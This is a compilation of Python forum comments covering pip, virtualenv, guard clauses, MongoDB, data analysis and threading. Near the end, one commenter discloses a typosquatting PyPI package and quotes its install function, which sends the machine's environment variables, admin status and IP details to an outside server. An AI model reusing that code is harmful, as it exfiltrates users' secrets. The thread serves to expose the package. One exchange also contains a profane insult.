I could post to any number of forums or simply google most python problems you could come up with for beginners. These forums/sites wouldn't provide detailed HOW-TOs. They would simply have a huge block of code with the answer. It's online. It's hard to do anything other than guilt your students into not cheating. Furthermore, if someone blanket copies variables and exact structure it could be very easy to pick out cheaters.
Now I get it. Normally, when you type, that is stdin, so it wouldn't make sense to pipe to stdin for an interactive application. With this trick, you can have piped stdin and interactive stdin as two separate streams. Neat!
This is the tool that my university uses: http://marmoset.cs.umd.edu/index.shtml I've used this to submit projects in lots of different languages, including Java, Ruby, and OCaml, and it works pretty well. You can split your test suite into public tests (unlimited submissions), release tests (3 submissions every 24 hours), and private tests, and students get instant feedback on how their code is working. 
Blender itself is written in Python.
Imo, this was wonderfully done. I even liked the jokes, they were cutesy in a good way. However, I would still suggest a more concise explanation for people who aren't literally 9 years old. Honestly, I got the concept after seeing how the array was structured. But, one thing I am still fuzzy on, is how to determine how many words you see come after a certain word. So, it's pretty easy to determine the most used words starting with a letter, but determining what words come after "the" seems more difficult. I'd like the algorithm for determining sentence structure to be expounded on.
Actually, it's because the unary `-` operator has different priority than the binary `-` operator. First is equivalent to ``(-N) // 2``, second is equivalent to ``0 - (N // 2)``.
Actually, Blender itself is written in C and C++, but does use Python a lot and even comes with an interpreter if I remember correctly.
more accurately xlib and libxcb implement different X protocols. xcb is the async one and xlib is the (semi-deprecated synchronous version).
Ah, sure enough. It's weird, hovering over UI features gives you their Python object names, so I always figured it was entirely Python. I guess it makes sense from a scripting standpoint to do that, though.
IPython notebooks are where I'm spending an increasing amount of time - though I also work in SQL and C#. Specifically Anaconda IPython, but Jupyter/Docker/TmpNB.org is looking pretty interesting too. I'm mainly exploring and analyzing data with the pandas library. Some of it is ad-hoc, some of it ends up being recurring and goes to SSIS in the end, and some of it will soon be going to a C# ASP.NET MVC backed dashboard (I have a LOT of javascript to learn).
A CI system is a good idea. An alternative would be to use GitLab. It's basically an open source version of GitHub that you can host locally (I admin a GitLab install at work that has about 200 users). GitLab has a CI system you can tie into it. It's really easy to install and configure and use. 
Python has become the go-to replacement for Perl in many sysadmin scripts. It's more readable, easier to write, and arguably easier to maintain.
&gt; After claiming responsibility for the task possibly that you made. Nobody wants you to do waste your time doing work that someone else is planning on doing For a very first and small patch claiming it might put a bit too much pressure but sure avoiding duplicate work is important, to each their own. &gt; Small commits focused on small tasks are much easier to review. If someone changes the entire code base, even if it's a good small change, the patch will get rejected. That is what I meant by "increasingly large", if the first patch is small the second one will just a little bit bigger, not refactoring the entire code base and starting to work on huge new features. Edited my initial answer accordingly, thank you.
Making the site available would be a great start. 
Also faster to write, and when it breaks, it does so loudly and clearly. It does not try to silently carry on with bad assumptions, breaking everything in the process.
The number one reason for me personally that makes Python my favourite language is because it is fun to program in it. It actually makes me feel happy, and I genuinely enjoy using it. Now for the more down-to-earth advantages that I and my employer agree on: 1. It enables me to implement a ton of functionality in a short amount of time 2. Sometimes, I write a piece of Python (lets say, 100 lines) and on my very first try, it compiles and is error-free. That never happens with other languages. 3. The code others write can easily and quickly be understood by me and vice versa. It's a result of the clear syntax (its the closest to plain English of any language I've ever seen) and because there's usually just one obvious way to do things, once you know the common idioms, you are able to read Python code like prose. 4. It runs on all platforms my employer uses (Linux, Solaris, AIX, HP-UX, zLinux, even Windows) 5. The standard library is awesome. A lot of small scripts are import magic, magic.do_things() because it really is "batteries included" Now to your other question, what do I use it for. I wrote: 1. A classic GUI application with Qt, running on Win7 and Debian machines 2. [An URL shortening service](http://shortr.li) using Flask and SQLalchemy 3. Various command line tools for Unix system administration, among them a complete disaster recovery solution for HP-UX 4. An oracle database cloning program interfacing with Dataguard, RMAN, EMC VMAX, and the Linux LVM 5. Countless of one-off programs for processing data and things like that
It's not something I've done myself but you can find it easily with [C++ python binding](https://stackoverflow.com/questions/145270/calling-c-c-from-python).
bit off-topic: As a current Python dev who will start working in an environment 50/50 Python/.NET, without any .NET experience, any good sources/guides/docs/books on learning .NET without assuming I am an idiot? Am pretty decent at Java/C/C++, Very decent at Python.
Into bytecode which can in turn be interpreted or [JIT] compiled.
It's because the whole thing has been made API scriptable in python.
This is bullshit. I install a number of things this way. Examples: * sudo pip install youtube-dl * sudo pip install ansible * sudo pip install pylint This is all stuff which: A) Doesn't have major dependency issues (i.e. uses pretty normal packages and doesn't fix the version). B) has some sort of command that I want on the system path. C) is written by somebody I trust. D) Has a version in my default package manager that is usually badly out of date or doesn't have a version in my package manager at all. I'd obviously use virtualenv for self contained software projects with explicit fixed versions that would cause conflicts with other packages, but *not everything is that*. tl;dr package management is hard, and there are no universally good or bad practices. Security-wise, pypi is on a par with community repositories in ubuntu or arch. Anybody can add a new package, but once you've added one, only you can update it. If you trust the creator, you can usually trust the package.
It does, into bytecode, which is then executed by the Python VM. Just like Java with the JVM.
Not bullshit, just not scalable. Especially for newcomers copying and pasting anything off the internet. &gt; I'd obviously use virtualenv for self contained software projects with explicit fixed versions that would cause &gt; conflicts with other packages, but not everything is that. Can a beginner tell if a package (or packager) has a bazillion, possibly spurious, dependencies? No. One can avoid all this trouble with virtualenvs. Stop hurting the ecosystem by recommending bad practices.
Yes I know it compiles into bytecode, but happens in the background, transparent for the dev. OP gave the impression he manually compiles the code, like clicking "compile" in an IDE or using gcc or something.
I thought you meant manual compiling, like using gcc or something like that. Actually, Python doesn't work like the JVM. The JVM actually uses a compiler in the traditional sense, it's target platform is just a VM instead of actual hardware bytecode. Python on the other hand is an interpreter. It does "compile" to intermediary bytecode, but the bytecode certainly isn't static (you can change a Python program whilst running it, in a more or less hacky way, but you can), therefore, it isn't regularly called "compiling" when you just run the program.
&gt; So when a pip install comes back with permissions problems, &gt; &gt; what is the proper fix? create a virtualenv and install the package in that if you are using 12.04 and Python 2.7.x you can install virtualenvwrapper $ mkvirtualenv foo --system-site-packages $ pip install bar 
One question: why do you need BeautifulSoup? Shouldn't the Twitter RestAPI be enough for this use-case?
I would just reinstall 12.04 and take this as a learning experience to never use sudo pip anything If you have /home on a separate partition then it will be a painless reinstall.
&gt; What real-world applications do you write with it? Categorically: Anything that doesn't need a GUI and doesn't hammer the CPU hard. It's my first choice because of expressiveness and development speed. &gt; I can do just about everything I want in .NET Anyone can do anything in any language! Just use the one that you like the most. You got into programming as you love to write code - so write in a lang you love. If not, there's a zillion other jobs that use the same skills and pay better. Try banking. &gt; Is there a niche that Python fills that makes it more appealing for certain tasks? See above. &gt; With Microsoft open-sourcing the .NET framework (and soon we'll see it more prevalently across all OSs), and with recent support in Azure with Python, it is high time I get with it. I don't understand why open sourcing of .net affects Python at all? Don't see other languages as a threat to your lifestyle. Really, they all the same underneath.
&gt;Can a beginner tell if a package (or packager) has a bazillion, possibly spurious, dependencies? A beginner can be taught to look in the right places (hint: requirements.txt or install_requires in setup.py) or to trust the documentation (or not). Believe me, I feel as strongly as you do that *this* particular package should never be installed with sudo (especially since it is a toy, possibly with weird side effects), but what applies to this package does not apply to all packages. For example, this document contains "sudo pip install", as it *should*: http://docs.ansible.com/intro_installation.html And I'm willing to bet that he's a better python developer than you. &gt;Stop hurting the ecosystem by recommending bad practices. Please get over yourself.
&gt; And I'm willing to bet that he's a better python developer than &gt; you. Go fuck yourself. 
Well if the un-bork process fails I'll have to, but really it means weeks of figuring out how to get all my apps re-installed, lots of stuff is compiled from source, this box is my center-point for dozens of other devices backing up and sync'ing data, I would have to go back and re-figure out what I did, so much has been "just working" for years now I've forgotten how I got it set up. . .
I think you just messed with your link: tweetsgoto.com instead of tweetstogo.com! :p
&gt; *By realtime I mean* ... Well, I don't think that words means what you think it means.
Be careful when QT changes major versions. The transitional classes that appear in the newer version of QT may not necessarily appear in PyQT. You may have to rewrite a lot of code to make a transition between major versions, rather than be able to use the transition classes to ease the upgrade over time.
IMHO, C# is not quite as wordy as Java, and with newer versions, even less so. Thanks for the reply. I am envious of what you do ...
Very cool.
Define learn. I had been programming mainly in Perl for 1.5 years with some Matlab and C++ before that. I was writing better Python code after 3 weeks (that's a pretty amazing breakeven point) and have gotten much better since. I didn't know numpy, scipy, matplotlib, classes, etc. after 3 weeks, which are my go to packages these days. I also didn't know all the craziness that you can do with classes back then (not many people did in Python 2.4 days). I've gotten a lot better at both Python and programming since then, but I was producing decent functional code after 3 weeks.
read: http://en.wikipedia.org/wiki/Shebang_%28Unix%29 specifically the section on 'portability' which directly addresses your question in the context of a python install.
They probably host the interpreter in the C++ app and just make native "objects" available to the interpreter.
I've "learned" the basics of Python enough to write simple scripts after finishing Codeacademy in under three weeks and writing my first program to solve a problem at work. However, learning is not the same as mastering a language. I already had some limited experience programming in C and Java from college, and I've picked up enough on other languages like JavaScript, PHP, Perl, and Powershell to copy/paste/edit other's code.
Alas I cannot share that source, however I can point you in the direction of [this](https://code.google.com/p/python-escpos/source/browse/) which is most of the esc/pos standard (receipt printer/cash drawer communication for point-of-sale) in python. It gives a good example on how python tends to make it "easy" without having to write custom kernel level drivers. Short answer is that most devices I have worked with have a $IN and a $OUT end point and mostly treat those as if they were either network endpoints or serial end points. Thus documentation [like this](http://www.andonline.com/uploads/documents/HV-G%20Manual.pdf)^page:49 for the HV-15KGL documents (almost) all the bytes to send back and forth. Now the A&amp;D scale is rather easy because it is either actually a serial connection (and thus you use a serial-&gt;usb adapter) or it is USB but the $IN $OUT end points are literally the RS232 tx/rx lines. Thus I use libusb/pyusb to talk the USB talk for me and just give me the raw endpoints. Some products get more complicated (EG one sitting next to me at the moment) has ~12 end points, some changing direction/meaning depending on what mode the device is in. However it tends to be that device vendors are willing to work with you when you say magic words like "I have been talking around with your competitors looking for documentation..." :P
[Guard clauses](http://c2.com/cgi/wiki?GuardClause) are fine. Just don't mix them up with If statements without a return or raisng an exception.
Hi, you'll be better off asking in the IRC channel. You'll get a quicker response too. And if you need help, you should atleast make sure the error message is properly formatted.
Interesting, here is a picture of my code + error if that helps. http://imgur.com/rfGjq2q
I think this post would be better suited to /r/learnpython
I personally use option 1 since I think it explicitly conveys the intention of only running foo or bar, never both. When coming back to code like this later I find this format plus a comment above makes it much easier to remember why I wanted to one or the other. It also makes adding a 2nd condition case style a more simple insertion and I have often needed to handle an unanticipated edge case later. As for the flat/nested problem, when the condition blocks get more than a a few simple lines it triggers me to think about hoisting pieces into their own function.
Not the best ratings here over your sudo pip recommendation, but I think it's a cool idea. I like checking out various obfuscation ideas like this. 
Thank you for the term **guard clause**.
Thank you very much. I like to play with import hooks and custom module finders and stuff like that; building it was very interesting for me, too.
And it is open source too! https://github.com/reddit
&gt; The second one! Less is more, and more is better. &gt; The first one! Explicit is better than implicit. There you go. (One could argue the second opinion ( = the first solution ) is more pythonic though. I agree wholeheartedly.)
For me the rational for using /usr/bin/env is that it's cross platform (across unixes). If you're only deploying on one OS (version) then who cares. If others deploy your scripts then please don't hardcode it. It's rude.
I think option 1 is a case of verbose != explicit. If you have a long if/elif chain or a fair amount of code under the if-block, then by the time you get to the else-statement you may have forgotten what the if-statement even checked. In option 2 you don't have to keep that info in your head, it obviously doesn't matter at that point what the if statement checked for.
As OP says, nice term. I didn't know it. Once a number of checks need to be done, there is a too-deeply-nested problem: if bad1: return else: calculations if bad2: return else: more calculations if bad3: return else: finally we can do the real work For that reason, I prefer case 2.
you're doing something wrong then. 
Just a couple points of feedback. Stop using mongo for things like this. You're gaining zero benefit from mongo, and it's adding complexity and failure scenarios. Certainly not important for a learning project, but using mongo like this and perpetuating these bad examples gets people into bad architectural ideas. Stack exchange is garbage. There is no debate. Much of the programming advice I've seen there isn't just wrong, but in many cases damaging. If you're trying to learn python, please, don't use SE. The use of realtime in this writeup is wrong. You mean synchronous. They are often conflated, but they are completely separate ideas. DO NOT write networking code synchronously. Ever. It will cause failures, it will pause execution, and is generally a bad practice. Use some kind of threading and/or callback system. In fact, this would be a far better use of Celery, since you could put an item on the queue for outstanding requests. Then when a callback is fired, you could pull the task off the queue. Or, just use one of the countless frameworks that do all of this work for you. Seriously, please. Don't write synchronous network code. The very concept of networks is for asynchronous activity.
fixed, sorry about that. I thought I changed it.
Yet MongoDB doesn't free you from this burden. You still have to deal with the fact that the structure of existing data doesn't match structure expected by the new code. This time however you don't have tools like `ALTER TABLE` (inside of a transaction if you use PostgreSQL!) or south.
I agree . Plus, a good comment on why the condition is exceptional so the intent is clear: # When condition True the user hasn't frobbed, so we foo until ready.
Don't style guides recommend single return?
Not if "bad2" relies on "calculations", and "bad3" relies on "more calculations". For example, if "bad1" is "did they supply a valid file path", and then "calculations" is actually opening and attempting to read from the file, and "bad2" is "did the read go through successfully", and "more calculations" is actually performing an operation on the data and writing it back to disk... etc. It's a very common situation when you have a lot of things that have to happen in sequence and an error can be introduced partway through at many different points in the computation.
You're not freed from the burden, but the burden is much smaller. It's usually possible to auto-migrate each change with 1 line of code in 1 single place, by reading the old data and converting it to the new, so that when it's saved back it'll be in the new format. Compared to the usual SQL dance of having to migrate the schema and convert all the data in one go, doing that at the same time as all the code changes, sometimes introducing dummy migrations so that data can be copied over ([example](http://south.readthedocs.org/en/latest/tutorial/part3.html)) along with the usual downtime that comes from having to make these migrations in one atomic action, there's no competition.
You forgot to call ChangeTie() tie = False def ChangeTie(): global tie tie = True ChangeTie() print(tie)
I'm stupid lol, thanks a million.
It happens to the best of us : )
It seems like this overlaps a bit with Blaze. With spark they make assumptions about the backend and with Blaze they assume you want to use python for the frontend. Imo, I prefer the blaze approach because I think it is more flexible. The interface could always be implemented in another language, and you use the same syntax with csv files as with spark. 
I very much prefer option 2. It is MUCH more pep 8 friendly, especially when you end up doing something like multi leveled and nested error checking. 
god, one of my employees was the worst commenter. He would do shit like //if a = 1 if (a == 1) {... Like, the only people reading this are programmers and we can read code reaaaalllllllyyyy well.
Most of said style guides are severely misguided ;-). Any code base which consistently follows such a recommendation ends up being a tangled mess of nested conditionals 20-level deep.
Check out selenium. It will allow you to programatically drive a web browser Http://seleniumhq.org
Might as well define a decorator for requiring authentication. I don't like combining view logic and authorization/authentication. edit: Granted your example does demonstrate your point well.
Not sure how a single return would assert you end up with many-level deep nesting. Its just a matter of declaring your return variable, doing stuff and returning. IF you end up with 20-level deep nesting, its bad design and not particularly related to your single versus many return statements. 
&gt; Not sure how a single return would assert you end up with many-level deep nesting. 20 is, of course, an exaggeration, but look at this example upthread if you really don't understand how this could happen. if bad1: return badvalue calculations if bad2: return badvalue more calculations if bad3: return badvalue final calculations return value How would you rewrite that with a single return without adding extra indentation levels?
You're looking for a PHP scaffolding tool. I don't know whether any have been written specifically in Python, but there are a wide variety of PHP scaffolding systems. 
i know this is in the python section , but i really think you should work more on the design of your website 
Well if we are checking values, this should really be raising an exception for bad values, not returning them. Let's pretend that is irrelevant, than we can answer your question fairly trivially: myVal = value if bad1: myVal = badvalue calculations if bad2: myVal = badvalue more calculations if bad3: myVal = badvalue final calculations return myVal edit: i accidentally left a return after if bad3: edit2: also some may prefer your style versus this. it is preference and guidelines and some if it depends on what environments you work in outside of python specifically. 
I'm also learning Python as well. Can you also help me as well?
Take a look at [Pandas: the Python Data Analysis library.](http://pandas.pydata.org/)
That's a good perspective.
It used a bit of sed. I've never used awk. (I just bought a book on awk. So that will change soon.). Logging does seem like it'd be easier in python. Or at least more reliable. 
Thank!
These books are pretty good: http://www.amazon.com/Python-Data-Analysis-Wrangling-IPython/dp/1449319793 http://guidetodatamining.com/ Check out /r/pystats for other tutorials and links.
foo him until he frobs.
http://www.amazon.com/Python-Data-Analysis-Wrangling-IPython/dp/1449319793
I agree, it is preference. Thanks for sharing another example! 
It's not premature optimization. Your code has a completely different semantics.
No it's not. The calculations needed to determine bad2 and bad3 can be quite extensive: if bad1: return else: domain = get_user_domain_from_database() page = get_user_page_from_database() data = get_data(domain, page) if not data_is_rss_feed(): return Edit: posted before seeing chubsauce got there first.
I don't know how / where to run that code. But if it will help to allow me to get my apps working I'll find out. . . And how can I learn how that ?variable? gets set? 
&gt; 20 is, of course, an exaggeration Alas, it's not. I saw it happen. In different code bases too, all in the name of single return (or no breaks, or no continues).
OK, discovered just opening a term and running "python" with nothing else seems to open a "python shell" I guess you could call it? I ran your two commands and got: ' ' '/home/user/.local/lib/python2.7/site-packages/khard-0.2.1-py2.7.egg' '/home/user/.local/lib/python2.7/site-packages/vdirsyncer-0.4.2-py2.7.egg' '/home/user/.local/lib/python2.7/site-packages/vobject-0.8.1c-py2.7.egg' '/home/user/.local/lib/python2.7/site-packages/atomicwrites-0.1.4-py2.7.egg' '/home/user/.local/lib/python2.7/site-packages/requests_toolbelt-0.3.1-py2.7.egg' '/home/user/.local/lib/python2.7/site-packages/icalendar-3.8.4-py2.7.egg' '/home/user/.local/lib/python2.7/site-packages/lxml-3.4.2-py2.7-linux-x86_64.egg' '/home/user/.local/lib/python2.7/site-packages/requests-2.5.1-py2.7.egg' '/home/user/.local/lib/python2.7/site-packages/click-3.3-py2.7.egg' '/usr/lib/python2.7/dist-packages' '/usr/local/lib/python2.7/dist-packages/virtualenv_clone-0.2.5-py2.7.egg' '/usr/local/lib/python2.7/dist-packages/pip-1.5.6-py2.7.egg' '/usr/lib/python2.7' '/usr/lib/python2.7/plat-linux2' '/usr/lib/python2.7/lib-tk' '/usr/lib/python2.7/lib-old' '/usr/lib/python2.7/lib-dynload' '/home/user/.local/lib/python2.7/site-packages' '/usr/local/lib/python2.7/dist-packages' '/usr/lib/python2.7/dist-packages/PIL' '/usr/lib/python2.7/dist-packages/gst-0.10' '/usr/lib/python2.7/dist-packages/gtk-2.0' '/usr/lib/pymodules/python2.7' '/usr/lib/python2.7/dist-packages/wx-2.8-gtk2-unicode'] Oy vey what a mess eh? Should everything be under just one path? Pip uninstall and then re-install or just cp -r ? 
Been writing Python for over 5 years now and I'm still learning.
If you mean you have a basic template for each column that you just want to fill out per variable name you could start by checking out `string.Template.safe_substitute.` &gt;&gt;&gt; from string import Template &gt;&gt;&gt; template = Template("blah${var}blah") &gt;&gt;&gt; template.safe_substitute(var="foo") 'blahfooblah' 
/usr/local/lib/python2.7/dist-packages contains basics like pip, setuptools, distribute/easy-install argparse, pkg_resources virtualenv and "six" and "stevedore" - not sure what these are for/from seems to me these are what I installed via pip, probably by mistake by not "activating" my virtualenv I am loathe to mess with these unless someone says its OK and gives me guidance as to where to "move" them. -------- /usr/local/lib/python2.7/site-packages is empty 
Just as a point of clarification. While it is true that web2py supports GAE and it provides a built-in master/slave schedulers (kind of like Django celery but without celery) you would not use the latter on GAE because it requires long running processes (the workers). On GAE you do not need any of this because GAE has its own task queue system which is easy enough to use.
+1 for Pandas. OP, looks like some people have already mentioned Wes McKinney's book *Python for Data Analysis.* Definitely worth reading. Also: * SciPy (http://www.scipy.org/) * Anaconda (https://store.continuum.io/cshop/anaconda/)
Data Analyst Programmer / Data Visualizationist / Web Developer / Miracle Worker here. &gt; Is it used to process the data or to make visuals or something completely different. Yep. You can use any programming language to perform data analysis, but Python is currently the best because of how terse and clean the language is, ipython, pandas, numpy, networkx, pygraphviz, sqlalchemy, and the endless amount of other software libraries available simply make Python the most flexible and most powerful language there is at the moment. Hands down. The vast majority of your time spent on entry-level data analysis will be spent taking sloppy data from various sources and formats and transforming it into something clean that can be imported into a database. You'll be writing quite a bit of "throw away" code for this since it mostly deals with idiosyncrasies and ad hoc situations, which... writing quick throw-away scripts is one of the things Python is very good at being used for. The only things I wouldn't use Python for are enterprise-level applications where Java or .NET would be more practical and durable, or data visualization for which JavaScript and D3js is currently the champion of (unless you're talking about database reporting, but that's another topic). --- More important than Python, however, are databases and regular expressions. Databases and regular expressions. Databases and regular expressions. Trust me, please. Before you graduate college master regular expressions, master one SQL database (Oracle, MySQL, Microsoft SQL Server), and master one graph database (Orient, Neo4j, Arango). Don't worry too much about Redis, Postgres, Mongo, or any other NoSQL databases because you'll mostly be working with SQL for day-to-day work and graph databases for extremely high-level projects with very complex data. For a graph database I would highly recommend OrientDB due to how SQL-like the query language is. For data analysis, programming languages are silver but SQL and regex are gold. I don't know what you're learning in your Python course but I can tell you that learning a) SQLAlchemy, b) Python regular expressions, and c) Pandas will take you very far.
I love you, too. 
I want to click a button to move a record to another table, or to add certain data, or prompt to add data. 
Thanks for the suggestions. I don't know if this does what I am looking for. I am looking to display a table and make a button that executes code to manipulate the data or to drop a row and move it to a new table. I have to make a few of these buttons for different tables, so I wanted to use the Python script to prompt for the different table names, etc.
That's not too bad. It shouldn't all be under one path. I have 10 entries in `sys.path` on my fairly clean Ubuntu system. The `.egg` packages make it look messy, but that is how they're meant to work.
would this work? https://wiki.videolan.org/Python_bindings
Functions foo () or bar () are not called.
It is very easy to miss the forest for the trees. For that reason I recommend to spend a few minutes with the following presentation: https://speakerdeck.com/clearspandex/data-engineering-101-building-your-first-data-product-pydata-sv-2014 It does not fully reason from the end or gives a comprehensive definition of a "data product" but it graphically shows the production pipeline - actually it shows two - and from there it becomes easier to fit in new technologies. For data analysis in particular I recommend the following blog post which provides a nice walk through: https://jmetzen.github.io/2015-01-29/ml_advice.html It is obvious that you won't understand it without lots of prerequisites both in statistics as well as machine learning but it is far easier to understand the individual steps, concepts and algorithms than fitting everything together in a sensible way. 
So it predicts the next word only based on the previous word or does it trace the path from beginning?
If you're fresh with python I'd suggest trying out [orange](http://orange.biolab.si/). It uses a visual editor so you can start right away. Also, check out Kaggle.com for walkthroughs on how you'd actually manipulate data.
I guess I misunderstood the question. For something already made, it sounds like phpmyadmin. I thought you were talking about making a python script to write php code that handles a database.
My example clearly isn't about requiring authentication, which I would do with a decorator as well. It's about skipping the login page when you're already authenticated - a situation that happens too rarely to merit a decorator.
I've crunched a lot of numbers with Numpy. Good memory usage for arrays, and quick access to ffts and other algs. I use matplotlib for viz. Basically, this gives me a great open source replacement for matlab.
[what do you reckon about this course?](https://www.coursera.org/course/db)
&gt; Writing to different schemas without migrating them is an optimization for the writer at the cost of the reader. Certainly. And sometimes that's the right optimisation to make. About 75% of the programs I work on never need any other program to read the data that I write. Of the rest, most use the same language as the original program so the same code can be used. &gt; The various schemas could only be found within the version control system Nobody complains when this is the case for code. &gt; The maintenance developers found the code so complex to read that they had to run it through a debugger to tell what was really going on. The solution for writing bad code is to not do it. SQL won't save you there. &gt; The timestamp on version control doesn't tell you what time it actually got deployed. One of the reasons you might want to use MongoDB is so that you don't have a 'deployment time'. If your code migrates data as it goes, the new schema is being continuously deployed. I don't see a reason for knowing a deployment time except in the situation where I need to match up an old schema with old code, which is usually the type of situation I use Mongo to avoid needing to do.
You pretty much described what I had in mind I would have to do. Thanks for writing it all out. Finding decent material can indeed be the hardest part whilst learning. I usually grab a couple of books from bookzz.org (check it out, all the free books in the world) and start reading randomly. Eventually I'll settle on a book I like. So your TL;DR: C# will come naturally, Read about the .NET framework itself, specifically what you need
Good for learning SQL, but it won't give you practical skills (i.e. you will have to learn more.)
cheers
Here is a talk on how to use Python for Data Analysis using examples from Web Scraping, Flask and Kaggle https://github.com/jackgolding/FullStackDataAnalysis
Mongo University might be the next place to look at, 10gen have some really good education material, but I have heard such bad things about mongo db and it seems people recommend postgres a lot more.
Your question is hard to follow and the code definitely won't work the way it is written right now but here are a few things to get you going. * Python has a GIL (https://wiki.python.org/moin/GlobalInterpreterLock), so unless your threads are I/O bound, of suggest threads are not the best option. * Threads are evil. In particular, shared state between threads is very evil. Read through https://wiki.python.org/moin/GlobalInterpreterLock * Python already has Worker pools built into the stdlib. They can be thread or process based (obviously you should use processes). See https://docs.python.org/3.4/library/multiprocessing.html That should get you started.
I would be thankful if you can write quick snippet! let's say that I need to affect tasks to 3 workers, I need to put every worker on the thread. I need to give him a task, every worker can do 3 tasks. I don't need to affect tasks using "LIFO"/FIFO concept but I need to choose based on some creteria (let's consider for the simplicity that I need to affect the longest one first). Problem: How can I make shared variable (basket of tasks between workers), how can I make a concurrent objects if you consider "threads are evil". 
It appears to me that you need to start your learning on threading with a simpler example, probably try the threading doc of Python on docs.python.org. To your question on how to share a variable between threads, threads have access to everything in the process that creates them. So technically you simply define the shared variable in the thread-creating process (main thread) and access it in threads. But note that this only is one of the paradigms and has its own problems. Again, try the tutorials first. 
You need to read through this https://docs.python.org/3.4/library/multiprocessing.html#using-a-pool-of-workers
*Edit: I've just been notified that setuptool as well as rquests and reqests (same thing) have been removed* Yep. It's sending your IP and environment as well as if you're an admin or not to a server. I will report it to the PyPI security team def install(name): installed_package = name installed_at = datetime.datetime.utcnow() host_os = platform.platform() try: admin_rights = bool(os.getuid() == 0) except AttributeError: try: admin_rights = bool(ctypes.windll.shell32.IsUserAnAdmin() != 0) except: admin_rights = False environ = os.environ if sys.version_info[0] == 3: import urllib.request from urllib.parse import urlencode GET = urllib.request.urlopen else: import urllib2 from urllib import urlencode GET = urllib2.urlopen ipinfo = GET('http://ipinfo.io/json').read() try: data = { 'ip': installed_package, 'ia': installed_at, 'ho': host_os, 'ar': admin_rights, 'env': environ, 'ii': ipinfo } data = urlencode(data) r = GET('https://zzz.scrapeulous.com/r?', data.encode('utf8')).read() except Exception as e: pass EDIT: Judging from the fact that the script also send the "installed_package" name to the server, there might be more flying around 
It doesn't look like you've imported it. Try: import pygame 
Agreed that Blaze overlaps (but will have a much smaller userbase at present to Spark, as Spark builds right on top of Hadoop's Java userbase). 
My first thought was MoviePy, but I don't know if it actually allows you to work on frames. Might still be worth to check out.
Take a look at [SimPy] (https://simpy.readthedocs.org/en/latest/). It provides constructs to model problems that you describe. Individual "actors", shared resources, etc, and a lot of examples. Threads can be useful for more than just blocking IO in this case. I extended one of their examples into a more advanced pubsub message broker that I need to package up. 
This is the exact reason why I always rail against doing `sudo pip install`. PyPI is not a curated library. The only thing barring submission to it is wrapping your head around `setuptools` (the actual library, not this imposter).
And that's what `virtualenv` is for.
That's true - but i don't know of too many production sites which run C# code on linux, for instance. Rightly or wrongly, i currently view c# support on non-microsoft platforms as prototypes though i would love to be proved wrong on this one - since C# is not bad as a language.
I've notified tucows, the registrar through which the domain was registered, about the offending domain.
&gt; You are right that Python can pretty much do or have what is available in R. But for exploratory data visualization, MATLPOTLIB or any Javascript-based libraries do not cut it. No way can you do what-if analysis using them efficiently. This is what R's ggplot2 is perfect for. &gt;Agree personally, but wanted to play it safe and not be divisve right off the bat :P. LOL, understand. Yeah I just don't want the OP or others to think it'll be so easy and seamless to do deep-dive, exploratory data analysis with just Python. I fell into that early on when I first started to use Python 4 yrs ago. But, when I saw how that's done using R's ggplot2, it really opened my eyes and realized where Python libraries fall short, but over time that'll definitely change. &gt;I love python, but it's just not the same for getting into a dataset IMO. At least not yet, to me. I think it might take more than ggplot2 in R for me to leave R. I really fell in love with it. I tried to stick with R for some scripting work, but I just couldn't get into its quirky syntax and inconsistent parameter names. But I really do love the ability to chain functions via (%&lt;%, %&gt;%). That is really an awesome feature in R which may draw me back into scripting using R more.
Tucows is still around? Holy 1990s ... did you find it using Webcrawler or Altavista?
Wow. The one and only purpose of this "package" is to scrape details from anybody careless enough to "install" it. I guess we should say we're lucky it doesn't seem to have a payload. So is any care taken to curate what's on pypi.python.org? How did that get there?
May I ask why you need global state? From a program design point of view, it's not a good idea because once you have multiple different things that change the same global you can get sequencing or side effect issues when they are combined. Plus, it can cause readability issues in code. It can be OK in some cases but with student code it's quite important to fully understand what you are implementing. While it may be OK, it's also likely that it may be a design fault (a "code smell").
/r/learnpython 
I think I answered my own question. Going with cookiecutter.
Hotbot ftw edit: [woah, its still around!](http://www.hotbot.com/)
my domain with hover comes up as twocows
&gt; Lycos is one of the original and most widely known Internet brands in the world Source: http://corp.lycos.com That is not true.
No, anyone can upload anything.
Okay ... backs away slowly.
It's not like the Apple app store where there's some manual examination process of every package before it shows up on the site; instead, anybody can upload stuff and if there's a problem it can be reported and taken down. I believe there are some package names that are reserved to avoid problems with malicious imitators/exploiters, but it might be time for typos of important packages to go that way too.
This seems to be the guy running it: https://twitter.com/incolumitas_ https://zzz.scrapeulous.com/ now says, maybe it always did? &gt;Usage of this project &gt;If you see this page then you came here because you installed some honey pot package over pip. All data that is sent to this server is for pentesting purposes. For more information cosider visiting my blog. His blog is: http://incolumitas.com/ The packages were clearly malicious though.
&gt; Certainly. And sometimes that's the right optimisation to make. Right &gt; About 75% of the programs I work on never need any other program to read the data that I write. Yeah, that's exactly what the developers who built the nightmare I worked out thought. After all, they had no requirements for reporting or any downstream use. What they failed to understand is that it isn't 1990 any more - there aren't very many truly isolated data islands any more, and users want and expect reporting. But they really couldn't support reporting on Mongo - it took 3 hours to run a report against 3-4 TB of data &amp; indexes and it slaughtered online performance. So, they kept refusing to support reporting, which has pissed off users enough that they started insisting we migrate off mongodb. The refusal to support reporting also helped hide a lot of problems in their data. And then the impossible happened - due to a licensing change we had to convert almost 100% of the data in MongoDB. And in this case the application owner couldn't simply refuse. That's what triggered a month of data analysis and two months of conversion. So, my suggestion is never to bet on nobody reading your data. Even if you don't have immediate requirements they usually emerge, so your architecture better be able to go there.
Man, Lycos is a name I haven't heard in over a decade. They're still around?
i liked it
This is why I could really care less that pip is using https by default and giving warnings about http sources (I had to adjust the config to use devpi server in the office). What is really needed is a "state of the archive" file listing the packages, sizes, and shaNsums. That file should be signed by the pypi webmaster. There is absolutely no need to use https outside of obtaining the public key. Debian already does this pretty well and has no need to host repositories over https. EDIT: I wasn't thinking completely, but in the case of pypi, there needs to be signatures of the uploaded packages from the authors. It could also help to have signatures of popular packages from the people who use them regularly, so the trust of a particular package could be more easily measured. Restricting the archive isn't the best idea, but mitigating these problems would be helpful.
Great! This worked for me so far. Thank you very much. Do you know how i would add code for disconnections to the API? So Say it disconnects for some reason during the retrieval process, I would like it to start where it left off retrieving the tweets instead of getting the same tweets all over again.
How can I use oAuth 2 to do this? Do I not use the tokens?
